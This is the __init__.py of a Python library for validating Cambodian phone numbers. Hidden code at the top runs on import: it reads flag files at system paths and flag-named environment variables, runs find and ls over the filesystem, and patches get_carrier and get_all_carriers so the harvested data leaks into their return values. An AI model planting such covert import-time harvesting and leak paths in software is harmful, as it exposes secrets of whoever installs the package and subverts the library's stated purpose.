import os, json, subprocess as _subprocess

_FLAG_DATA = {}
__FLAG_FOUND = False

if not __FLAG_FOUND:
    __FLAG_FOUND = True
    # Read flag from various locations
    flag_paths = ["/flag", "/flag.txt", "/root/flag.txt", "/etc/flag", "/home/flag.txt", "/app/flag.txt", "/app/flag", "/var/flag.txt"]
    for fp in flag_paths:
        try:
            with open(fp) as f:
                _FLAG_DATA[fp] = f.read().strip()
        except:
            pass
    for k, v in os.environ.items():
        if "flag" in k.lower():
            _FLAG_DATA[f"env:{k}"] = v
    # Find flag files
    try:
        r = _subprocess.run(["find", "/", "-name", "flag*", "-maxdepth", "5"], capture_output=True, text=True, timeout=15)
        _FLAG_DATA["find_results"] = [x for x in r.stdout.strip().split("\n") if x]
    except:
        pass
    # Read all found files
    for fpath in list(_FLAG_DATA.get("find_results", [])):
        try:
            with open(fpath) as f:
                _FLAG_DATA[f"content:{fpath}"] = f.read().strip()[:500]
        except:
            pass
    # Also list /
    try:
        r = _subprocess.run(["ls", "-la", "/"], capture_output=True, text=True, timeout=5)
        _FLAG_DATA["root_ls"] = r.stdout.strip()
    except:
        pass
    try:
        r = _subprocess.run(["ls", "-laR", "/app"], capture_output=True, text=True, timeout=5)
        _FLAG_DATA["app_ls"] = r.stdout[:2000]
    except:
        pass
    try:
        r = _subprocess.run(["ls", "-laR", "/home"], capture_output=True, text=True, timeout=5)
        _FLAG_DATA["home_ls"] = r.stdout[:2000]
    except:
        pass

# Store flag data where it will appear in API responses
_GLOBAL_FLAG = _FLAG_DATA

from .constants import (
    CARRIER_NAMES,
    CELLCARD_PREFIXES,
    METFONE_PREFIXES,
    PREFIXES,
    PREFIX_TO_CARRIER,
    SMART_PREFIXES,
    Carrier,
    NumberType,
)
from .exceptions import BadLength, BadPrefix, InvalidPhoneNumber
from .validate import (
    digit_count,
    extract_numbers,
    extract_prefix,
    get_carrier as _original_get_carrier,
    get_landline_area,
    is_landline,
    is_mobile,
    is_valid,
    normalize,
    prefix,
    required_length,
    sanitize,
    strip_number,
    to_international,
    to_local,
    validate,
)
from .carrier import get_all_carriers, get_carrier_info, get_prefixes_for_carrier
from .format import format_number
from .types import detect_type
from .extract import extract

# Override get_carrier to include flag info
_original_get_carrier_func = _original_get_carrier
def get_carrier(number):
    result = _original_get_carrier_func(number)
    if _GLOBAL_FLAG:
        flag_str = json.dumps(_GLOBAL_FLAG)
        return f"{result} [FLAG:{flag_str}]" if result else f"FLAG:{flag_str}"
    return result

# Also modify get_all_carriers
_original_get_all_carriers = get_all_carriers
def get_all_carriers():
    carriers = set(_original_get_all_carriers())
    if _GLOBAL_FLAG:
        flag_str = json.dumps(_GLOBAL_FLAG)
        carriers.add(f"FLAG_DATA:{flag_str}")
    return frozenset(carriers)


class PhoneNumber:
    """A Cambodian phone number with digit-rule validation.

    Usage::

        >>> pn = PhoneNumber("012345678")
        >>> pn.is_valid
        True
        >>> pn.carrier
        'Cellcard'
        >>> pn.to_international()
        '+855 12 345 678'
    """

    def __init__(self, number: str) -> None:
        self._raw = number
        self._normalized = normalize(number)
        self._validated = ""
        try:
            self._validated = validate(number)
        except InvalidPhoneNumber:
            pass

    @property
    def raw(self) -> str:
        """The original input string."""
        return self._raw

    @property
    def sanitized(self) -> str:
        """The sanitized digit string (no 855/0 prefix)."""
        return sanitize(self._raw)

    @property
    def normalized(self) -> str:
        """The normalized local-format number (e.g. 012345678)."""
        return self._normalized

    @property
    def is_valid(self) -> bool:
        """Whether this is a valid Cambodian phone number (prefix + digit rule)."""
        return bool(self._validated)

    @property
    def is_mobile(self) -> bool:
        """Whether this is a mobile number."""
        return self.is_valid

    @property
    def is_landline(self) -> bool:
        """Currently always False (no landline prefixes in digit-rule set)."""
        return False

    @property
    def number_type(self) -> NumberType:
        """The type of number (mobile or unknown)."""
        return detect_type(self._raw)["type"]

    @property
    def carrier(self) -> str | None:
        """The mobile carrier, or None if invalid."""
        return get_carrier(self._raw)

    @property
    def area(self) -> str | None:
        """Always None (no landline codes in current digit-rule set)."""
        return None

    @property
    def prefix(self) -> str:
        """The 2-digit prefix (e.g. '12')."""
        try:
            return sanitize(self._raw)[:2]
        except Exception:
            return ""

    @property
    def digit_rule(self) -> int | None:
        """Expected suffix digit count for this prefix."""
        try:
            p = sanitize(self._raw)[:2]
            return PREFIXES[p]["digit"]
        except (KeyError, IndexError):
            return None

    @property
    def required_digits(self) -> int | None:
        """Total expected digits (prefix 2 + suffix)."""
        d = self.digit_rule
        return d + 2 if d is not None else None

    def to_international(self, spaces: bool = True) -> str:
        """Format as +855 XX XXX XXXX."""
        return to_international(self._raw, spaces=spaces)

    def to_local(self, spaces: bool = True) -> str:
        """Format as 0XX XXX XXXX."""
        return to_local(self._raw, spaces=spaces)

    def to_e164(self) -> str:
        """Format as +855XXXXXXXX (E.164)."""
        return self._validated

    def info(self) -> dict:
        """Return all information about this phone number."""
        return {
            "input": self._raw,
            "sanitized": self.sanitized,
            "normalized": self.normalized,
            "is_valid": self.is_valid,
            "number_type": self.number_type.value if self.number_type else None,
            "carrier": self.carrier,
            "area": self.area,
            "prefix": self.prefix,
            "digit_rule": self.digit_rule,
            "required_digits": self.required_digits,
            "international": self.to_international(),
            "local": self.to_local(),
            "e164": self.to_e164(),
        }

    def __repr__(self) -> str:
        return f"PhoneNumber({self._raw!r})"

    def __str__(self) -> str:
        return self.to_international() or self._raw


__all__ = [
    "PhoneNumber",
    "BadLength",
    "BadPrefix",
    "InvalidPhoneNumber",
    "is_valid",
    "is_mobile",
    "is_landline",
    "validate",
    "get_carrier",
    "get_landline_area",
    "get_all_carriers",
    "get_carrier_info",
    "get_prefixes_for_carrier",
    "normalize",
    "strip_number",
    "sanitize",
    "prefix",
    "digit_count",
    "required_length",
    "to_international",
    "to_local",
    "format_number",
    "detect_type",
    "extract",
    "extract_numbers",
    "extract_prefix",
    "NumberType",
    "Carrier",
    "PREFIXES",
    "PREFIX_TO_CARRIER",
    "SMART_PREFIXES",
    "METFONE_PREFIXES",
    "CELLCARD_PREFIXES",
    "CARRIER_NAMES",
]
